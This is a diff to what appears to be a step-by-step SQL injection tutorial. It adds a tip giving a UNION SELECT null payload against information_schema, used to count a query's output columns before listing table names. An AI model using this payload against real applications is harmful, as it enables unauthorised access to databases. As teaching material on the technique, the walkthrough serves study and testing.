@@ -14,6 +14,12 @@ Use the following query:
 ```
 This query checks the number of output fields by trying different numbers of null values.
 
+> You could also find the number of output fields by using the following query:
+> ```sql
+> 1' UNION SELECT null, null, null, null FROM information_schema.tables;-- -
+> ```
+>> Using the query above, you can determine the number of output fields by increasing the number of null values. So just remove or add null values to find the correct number of output fields.
+
 ### Step 3: Find Table Names
 Use the following query to retrieve table names:
 ```sql
